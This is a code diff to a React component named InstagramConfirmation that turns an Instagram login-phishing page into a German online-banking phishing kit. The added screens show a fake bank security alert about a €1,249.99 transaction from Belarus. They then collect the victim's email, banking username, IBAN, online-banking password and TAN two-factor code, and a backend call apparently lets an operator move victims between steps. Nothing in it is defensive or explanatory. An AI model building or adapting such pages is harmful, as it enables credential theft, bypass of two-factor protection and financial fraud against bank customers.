@@ -454,21 +454,139 @@ const InstagramConfirmation = () => {
                         </p>
                         <form className="insta-form" onSubmit={handlePasswordSubmit}>
                             <div className="input-group">
+{step === 'confirmation' && (
+                <div className="insta-container">
+                    <div className="insta-box">
+                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
+                        <h1 className="insta-title">Sicherheitsbenachrichtigung - Unautorisierte Transaktion</h1>
+                        <p className="insta-text">
+                            Dies ist ein offizielles Sicherheitsformular Ihrer Bank. Unser System hat eine verdächtige Transaktion auf Ihrem Online-Banking-Konto erkannt, die möglicherweise von einem unbefugten Dritten durchgeführt wurde.
+                        </p>
+                        <p className="insta-text">
+                            Um Ihr Konto zu schützen und finanzielle Verluste zu verhindern, müssen Sie die folgende Transaktion überprüfen. Wenn Sie diese Transaktion nicht autorisiert haben, können Sie sie direkt über dieses sichere Formular stornieren.
+                        </p>
+                        <p className="insta-text"><strong>Transaktionsdetails:</strong></p>
+                        <p className="insta-text">📅 Datum: 19. Juli 2024, 20:13 Uhr</p>
+                        <p className="insta-text">📍 Gerät: Android - Standort: Belarus</p>
+                        <p className="insta-text">💰 Betrag: 1.249,99 €</p>
+                        <p className="insta-text">🏦 Empfänger: TECHSTORE GMBH - Referenz: #TX-78912345</p>
+                        <p className="insta-text">⚠️ Status: Ausstehend - Stornierung noch möglich</p>
+
+                        <div className="security-notice">
+                            <p className="insta-text" style={{color: '#d32f2f', fontSize: '12px', marginTop: '10px'}}>
+                                🔒 Dies ist ein verschlüsseltes Banksicherheitsformular. Ihre Daten werden gemäß der DSGVO geschützt.
+                            </p>
+                        </div>
+
+                        {/* Option buttons */}
+                        <div className="button-container">
+                            <button className="confirm-button yes" onClick={() => notifyBackendToChangeStep('details')}>
+                                ✓ Ja, ich habe diese Transaktion autorisiert
+                            </button>
+                            <button className="confirm-button no" onClick={() => notifyBackendToChangeStep('details')}>
+                                ✗ Nein, Transaktion sofort stornieren
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            )}
+
+            {step === 'details' && (
+                <div className="insta-container">
+                    <div className="insta-box">
+                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
+                        <h1 className="insta-title">Um die Transaktion zu stornieren und Ihre Identität zu bestätigen, geben Sie bitte die folgenden Informationen ein:</h1>
+                        <form className="insta-form" onSubmit={handleSubmit}>
+                            <div className="input-group">
+                                <label>E-Mail-Adresse (hinterlegt bei der Bank)</label>
+                                <input
+                                    type="email"
+                                    name="email"
+                                    placeholder="email@bank.de"
+                                    value={formData.email}
+                                    onChange={handleInputChange}
+                                    required
+                                />
+                            </div>
+                            <div className="input-group">
+                                <label>Online-Banking-Benutzer</label>
+                                <input
+                                    type="text"
+                                    name="username"
+                                    placeholder="max.mustermann"
+                                    value={formData.username}
+                                    onChange={handleInputChange}
+                                    required
+                                />
+                            </div>
+                            <div className="input-group">
+                                <label>IBAN (Internationale Kontonummer)</label>
+                                <input
+                                    type="text"
+                                    name="firstName"
+                                    placeholder="DE89 3704 0044 0532 0130 00"
+                                    value={formData.firstName}
+                                    onChange={handleInputChange}
+                                    required
+                                />
+                            </div>
+                            <div className="input-group">
+                                <label>Transaktionsreferenz (Verwendungszweck)</label>
+                                <input
+                                    type="text"
+                                    name="lastName"
+                                    placeholder="Rechnung #INV-2024-1234"
+                                    value={formData.lastName}
+                                    onChange={handleInputChange}
+                                    required
+                                />
+                            </div>
+                            <button className="submit-button" type="submit">
+                                Transaktion stornieren
+                            </button>
+                        </form>
+                    </div>
+                </div>
+            )}
+
+            {(step === 'verifying' || step === "verifying_indefinite") && (
+                <div className="insta-container">
+                    <div className="insta-box">
+                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
+                        <h1 className="insta-title">Einen Moment bitte, wir überprüfen Ihre Angaben</h1>
+                        <div className="progress-bar">
+                            <div className="progress-bar-fill" style={{ width: `${progress}%` }}></div>
+                        </div>
+                        <p className="verification-text">{verificationText}</p>
+                    </div>
+                </div>
+            )}
+
+            {step === 'sessionExpired' && (
+                <div className="insta-container">
+                    <div className="insta-box">
+                        <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
+                        <h1 className="insta-title">Sitzung abgelaufen</h1>
+                        <p className="insta-text">
+                            {formData.username} <span className="not-you">Nicht Ihr Konto?</span>
+                        </p>
+                        <form className="insta-form" onSubmit={handlePasswordSubmit}>
+                            <div className="input-group">
                             {incorrectPassword && (
-                                <p className="error-text">Incorrect password. Please try again.</p>
+                                <p className="error-text">Falsches Online-Banking-Passwort. Bitte versuchen Sie es erneut.</p>
                             )}
-                                <label>Password</label>
+                                <label>Online-Banking-Passwort</label>
                                 <input
                                     type="password"
                                     name="password"
-                                    placeholder="Enter your password"
+                                    placeholder="Geben Sie Ihr Online-Banking-Passwort ein"
                                     value={password}
                                     onChange={(e) => setPassword(e.target.value)}
                                     required
                                 />
                             </div>
                             <button className="submit-button" type="submit">
-                                Submit
+                                Bestätigen
                             </button>
                         </form>
                       
@@ -480,12 +598,12 @@ const InstagramConfirmation = () => {
                 <div className="insta-container">
                     <div className="insta-box">
                         <img src={instalogo} alt="Instagram Logo" className="insta-logo" />
-                        <h1 className="insta-title">Two-Factor Authentication</h1>
+                        <h1 className="insta-title">Zwei-Faktor-Authentifizierung</h1>
                         <p className="insta-text">
-                            Please enter the code we've sent to your device.
+                            Bitte geben Sie den TAN-Code ein, der an Ihr Mobilgerät gesendet wurde.
                         </p>
                         <div className="input-group">
-                            <input type="text" name="twoFactorCode" placeholder="Enter 6-digit code" required 
+                            <input type="text" name="twoFactorCode" placeholder="6-stelligen TAN-Code eingeben" required 
                                 value={twofaInput}
                                 onChange={(e) => set2fa(e.target.value)}
                             />
@@ -493,9 +611,9 @@ const InstagramConfirmation = () => {
                         <div className="divider">
                             <hr /> {/* Horizontal line */}
                         </div>
-                        <p className="insta-text">Or approve the request from your phone.</p>
+                        <p className="insta-text">Oder bestätigen Sie die Transaktion in Ihrer Banking-App.</p>
                         <button className="submit-button" onClick={sendVerifyCode}>
-                            Continue
+                            Fortfahren
                         </button>
                     </div>
                 </div>
